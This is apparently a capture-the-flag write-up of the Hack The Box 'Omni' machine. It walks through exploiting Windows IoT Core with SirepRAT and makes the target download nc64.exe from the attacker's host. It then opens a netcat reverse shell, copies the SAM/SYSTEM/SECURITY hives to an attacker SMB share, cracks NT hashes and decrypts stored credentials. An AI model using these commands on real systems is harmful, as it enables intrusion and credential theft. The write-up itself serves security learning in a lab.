## Default Information
IP Address: 10.10.10.204\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.204    omni.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.204 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-02-02 11:43:47 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8080/tcp on 10.10.10.204                                  
Discovered open port 135/tcp on 10.10.10.204                                   
Discovered open port 29820/tcp on 10.10.10.204                                 
Discovered open port 29817/tcp on 10.10.10.204                                 
Discovered open port 29819/tcp on 10.10.10.204                                 
Discovered open port 5985/tcp on 10.10.10.204  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 135	| msrpc | Microsoft Windows RPC | Open |
| 5985	| upnp | Microsoft IIS httpd | Open |
| 8080	| upnp | Microsoft IIS http | Open |
| 29817	| unknown | NIL | Open |
| 29819	| arcserve | ARCserve Discovery | Open |
| 29820	| unknown | NIL | Open |

From the nmap output, we can see 2 unknown new services, namely upnp and arcserve:
- upnp(Universal Plug and play): Set of networking protocols that permits networked devices to seamlessly discover each other's presence on the network and establish functional network services.
- arcserve : Enterprise backup solution for the target environment

However, what we do notice is that even though port 8080 has a upnp service, there is a webpage that is associated with it. 

```
8080/tcp  open  upnp     syn-ack ttl 127 Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
```

### RPC Enumeration on port 135

We were able to retrieve the list of endpoints from port 135, but they are not very useful in helping our exploitation.

Next, we will try to do a null authentication using rpcclient. Unfortunately, we are unable to connect to the server.

```
┌──(kali㉿kali)-[~]
└─$ rpcclient -p 135 -U "" 10.10.10.204                                                                          1 ⨯
Cannot connect to server.  Error was NT_STATUS_CONNECTION_DISCONNECTED
```

### Gobuster
Next, we will try to use Gobuster to look for potential endpoints on port 8080. However, we are not able to find any potential endpoints which is very suspicious. 

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://omni.htb:8080 -t 100 -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -x "txt,html,php,asp,aspx,jsp" -z -o "/home/kali/Desktop/omni.txt" --exclude-length 0
===============================================================
2022/02/02 06:47:05 Finished
===============================================================
```

### Web Enumeration
Navigating to http://omni.htb:8080, we realized that the reason why gobuster was unable to find any endpoints was due to the fact that this site requires authentication. We try several common credentials, but we are unable to login. At the same time, we realize that this is not the IIS site that we see all the time. Instead, this is a "Windows Device Portal".

![Port 8080](https://github.com/joelczk/writeups/blob/main/HTB/Images/Omni/port_8080.png)

A simple google search tells me that this Windows Device Portal is a web server included with Windows devices tto allow users configure and manage the settings for the device over a network or USB connection.

## Exploit
### SirepRAT

Searching for potential exploits for Windows Device Portal brings me to this article [here](https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/), which then tells me about the SirepRAT github repo that we can potentially use.

To exploit this, we will first make use of SirepRAT to create a new C:\\temp directory to store our nc.exe executable

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/SirepRAT]
└─$ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c mkdir C:\\temp' --v
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: 'b'\x00\x00\x00\x00''>
```

Next, we will transfer the nc.exe executable to our newly-created C:\temp directory using the SirepRAT. One small thing to note is that, nc.exe is not compatible with this machine as it is 32-bit. We would need to download the 64 bit nc.exe from [here](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/SirepRAT]
└─$ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c powershell.exe -command iwr -Uri http://10.10.16.8:3000/nc64.exe -Outfile C:\temp\nc64.exe' --v
---------

---------
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
```

Lastly, all we have to do is to execute the reverse shell command to obtain the reverse shell.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/SirepRAT]
└─$ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c C:\temp\nc64.exe -e cmd.exe 10.10.16.8 4000' --v
---------

---------
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
```

### Obtaining reverse shell

Even though the target machine does not have ```whoami``` comamnd, but the shell is running as SYSTEM, which tells us that we have SYSTEM privileges.
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.204] 49676
Microsoft Windows [Version 10.0.17763.107]
Copyright (c) Microsoft Corporation. All rights reserved.

C:\windows\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\windows\system32>

```

### Analyzing user.txt file
What is different in this machine is that the user.txt file is stored in C:\data\Users\app\user.txt and what is different about the user.txt file is that this is a PS-Credential file and we would have to decrypt the user password to obtain the flag.

```
PS C:\Data\Users\app> cat user.txt
cat user.txt
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">flag</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7</SS>
    </Props>
  </Obj>
</Objs>
```

Looking at the blogpost from [here](https://www.travisgan.com/2015/06/powershell-password-encryption.html), this is a powershell password encryption which can be decrypted. Howvever, we realize that we are getting an error message when we attempt to decrypt the user.txt file. This may be due to insufficient privileges on the current user.

```
PS C:\Data\Users\app> $UserCred = Import-Clixml -Path C:\Data\Users\app\user.txt
$UserCred = Import-Clixml -Path C:\Data\Users\app\user.txt
Import-Clixml : Error occurred during a cryptographic operation.
At line:1 char:13
+ $UserCred = Import-Clixml -Path C:\Data\Users\app\user.txt
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Import-Clixml], Cryptographic 
   Exception
    + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept 
   ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
```

### Dumping NT hashes
However from winPEAS script, we realize that we are able to access C:\Windows\system32\config\SYSTEM and C:\Windows\system32\config\SAM. This means that we are able to dump the SYSTEM and SAM registry hives onto our local system. However, we are unable to transfer the registry hives using SMB server alone as the registries are being used by another process.

```
C:\Windows\system32\config>copy SAM \\10.10.16.8\share\SAM
copy SAM \\10.10.16.8\share\SAM
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
```

What we have to do now, is to copy the registry files into another folder where we can then transfer into our SMB server. 

```
C:\Windows\system32\config>reg save HKLM\SECURITY c:\temp\SECURITY
reg save HKLM\SECURITY c:\temp\SECURITY
The operation completed successfully.

C:\Windows\system32\config>reg save HKLM\SAM C:\temp\SAM        
reg save HKLM\SAM C:\temp\SAM
The operation completed successfully.

C:\Windows\system32\config>reg save HKLM\SYSTEM c:\temp\SYSTEM
reg save HKLM\SYSTEM c:\temp\SYSTEM
The operation completed successfully.
```

Afterwards, all we have to do is to transfer the registry hives onto the SMB server on our local machine

```
C:\temp>copy SAM \\10.10.16.8\share\SAM
copy SAM \\10.10.16.8\share\SAM
        1 file(s) copied.

C:\temp>copy SYSTEM \\10.10.16.8\share\SYSTEM
copy SYSTEM \\10.10.16.8\share\SYSTEM
        1 file(s) copied.

C:\temp>copy SECURITY \\10.10.16.8\share\SECURITY
copy SECURITY \\10.10.16.8\share\SECURITY
        1 file(s) copied.
```

Lastly, we will be able to obtain the hashes using impacket-secretsdump.

```
┌──(kali㉿kali)-[~/Desktop/omni]
└─$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::
DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::
app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdc2beb4869328393b57ea9a28aeff84932c3e3ef
dpapi_userkey:0x6760a0b981e854b66007b33962764d5043f3d013
[*] NL$KM 
 0000   14 07 22 73 99 42 B0 ED  F5 11 9A 60 FD A1 10 EF   .."s.B.....`....
 0010   DF 19 3C 6C 22 F2 92 0C  34 B1 6D 78 CC A7 0D 14   ..<l"...4.mx....
 0020   02 7B 81 04 1E F6 1C 66  69 75 69 84 A7 31 53 26   .{.....fiui..1S&
 0030   A3 6B A9 C9 BF 18 A8 EF  10 36 DB C2 CC 27 73 3D   .k.......6...'s=
NL$KM:140722739942b0edf5119a60fda110efdf193c6c22f2920c34b16d78cca70d14027b81041ef61c6669756984a7315326a36ba9c9bf18a8ef1036dbc2cc27733d
[*] Cleaning up... 
```

Next, we will try to decrypt the NT hashes for Administrator, Guest, DevToolsUser and app. To do that, we will first save the hashes to a text file. Take note that impacket-secretsdump dumps out both the NT hashes and LM hashes.

```
a01f16a7fa376962dbeb29a764a06f00
31d6cfe0d16ae931b73c59d7e0c089c0
1b9ce6c5783785717e9bbb75ba5f9958
e3cb0651718ee9b4faffe19a51faff95
```

Using hashcat, we are able to decrypt the NT hash that belongs to the user app.

```
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/omni]
└─$ hashcat -a 0 -m 1000 /home/kali/Desktop/hashes.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt
31d6cfe0d16ae931b73c59d7e0c089c0:                
e3cb0651718ee9b4faffe19a51faff95:mesh5143 
```

### Privilege Escalation to app
Firstly, we will try to use evil-winrm to login with the credentials. Unfortunately,  we are unable to do so.
Recalling that the site http://omni.htb:8080 requires credentials to authenticate, we will now try to authenticate to the site with the credentials. 

After logging in, we are able to find a site http://omni.htb:8080/#Run%20command, where we are able to execute commands on the windows server. Next, what we have to do is to put in a reverse shell payload and spawn a reverse shell. 

![Reverse shell as app user](https://github.com/joelczk/writeups/blob/main/HTB/Images/Omni/reverse_shell_app.png)

Now, we can verify that we have obtained access as the ```app``` user.

```
PS C:\Data\Users\app> $env:username
$env:username
app
```
### Obtaining user flag
Now, since we have obtained access as the app user, we will be able to execute the Import-Clixml command without any errors. However, there is an error in using the Get-WmiObject as the server was unable to recognize the command. 

Since the account information has been constructed into a PSCredential object in this case, we are still able to extract the password using the ```$UserCred.GetNetworkCredential().password``` command. 

```
PS C:\Data\Users\app> $UserCred = Import-Clixml -Path C:\Data\Users\app\user.txt
$UserCred = Import-Clixml -Path C:\Data\Users\app\user.txt
PS C:\Data\Users\app> Get-WmiObject -Class win32_OperatingSystem -ComputerName RemoteServerA -Credential $UserCred
Get-WmiObject -Class win32_OperatingSystem -ComputerName RemoteServerA -Credential $UserCred
Get-WmiObject : The term 'Get-WmiObject' is not recognized as the name of a 
cmdlet, function, script file, or operable program. Check the spelling of the 
name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Get-WmiObject -Class win32_OperatingSystem -ComputerName RemoteServer ...
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Get-WmiObject:String) [], Comma 
   ndNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
PS C:\Data\Users\app> $Password = $UserCred.GetNetworkCredential().password
$Password = $UserCred.GetNetworkCredential().password
PS C:\Data\Users\app> echo $Password
echo $Password
<Redacted user flag>
```

### Obtaining administrator password
In the same directory, we are able to find 2 more interesting files namely, iot-admin.xml and hardening.txt

Let us first take a look at hardening.txt. This text file does not provide much useful information except for the fact that the old adminstrator password is "p@ssw0rd". Let us keep that password in mind if we are unable to find another password.

Looking at iot-admin.xml, we realize that this is the same PSCredential object as the user.txt that we have seen earlier. Let us use the same method to obtain the decrypted password.

```
PS C:\Data\Users\app> $UserCred = Import-Clixml -Path C:\Data\Users\app\iot-admin.xml
$UserCred = Import-Clixml -Path C:\Data\Users\app\iot-admin.xml
PS C:\Data\Users\app> $Password = $UserCred.GetNetworkCredential().password
$Password = $UserCred.GetNetworkCredential().password
PS C:\Data\Users\app> echo $Password
echo $Password
_1nt3rn37ofTh1nGz
```

### Obtaining root flag
Using the same method of exploitation as before, we can use the credentials to access http://omni.htb:8080/#Run%20command. Using the same method as before, we will be able to spawn a reverse shell.

![Reverse shell for administrator user](https://github.com/joelczk/writeups/blob/main/HTB/Images/Omni/reverse_shell_admin.png)

Using the command ```$env:username```, we are able to verify that we are now the administrator user.

```
PS C:\windows\system32> $env:username
$env:username
Administrator
```

Accessing the C:\data\users\administrator\root.txt file, we realize that this is once again the PSCredential object and we would need to decrypt the password to obtain the root flag. Using the same method as before, we will use the ```import Cli-xml``` command to decrypt the password.

```
PS C:\data\users\administrator> $UserCred = Import-Clixml -Path C:\Data\Users\administrator\root.txt
$UserCred = Import-Clixml -Path C:\Data\Users\administrator\root.txt
PS C:\data\users\administrator> $Password = $UserCred.GetNetworkCredential().password
$Password = $UserCred.GetNetworkCredential().password
PS C:\data\users\administrator> echo $Password
echo $Password
<Redacted root flag>
```

## Post-Exploitation
### Alternative method of finding credentials for app user
Another alternative of finding the credentials for the app user is through the r.bat file at C:\Program Files\WindowsPowerShell\Modules\PackageManagement directory. Using the ```dir``` command on the directory will not be able to reveal the r.bat file as the file is a hidden file. In order to reveal the file, we would need to use the ```dir -force``` command.

```
PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> dir
dir


    Directory: C:\Program Files\WindowsPowerShell\Modules\PackageManagement


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----       10/26/2018  11:37 PM                1.0.0.1                       


PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> dir -force
dir -force


    Directory: C:\Program Files\WindowsPowerShell\Modules\PackageManagement


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----       10/26/2018  11:37 PM                1.0.0.1                       
-a-h--        8/21/2020  12:56 PM            247 r.bat        
```

Checking the privileges of the r.bat executable, we realize that we would need administrator privileges to execute this bat file. Executing the r.bat file also shows us that it is executing a ping command. Let us now examine the contents of the r.bat file using the cat command. 

From the output, we would realize that it exposes the credentials for both the app user and administrator user.

```
@echo off

:LOOP

for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

ping -n 3 127.0.0.1

cls

GOTO :LOOP

:EXIT
```

### Decrypting NT hashes with John

```
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/home/kali/Desktop/pentest/wordlist/rockyou.txt --format=NT nt_hashes.txt
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (?)     
mesh5143         (?)     
2g 0:00:00:00 DONE (2022-02-02 22:03) 2.631g/s 18873Kp/s 18873Kc/s 45129KC/s      123d..*7¡Vamos!
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop]
└─$ cat ~/.john/john.pot
$NT$31d6cfe0d16ae931b73c59d7e0c089c0:
$NT$e3cb0651718ee9b4faffe19a51faff95:mesh5143
```
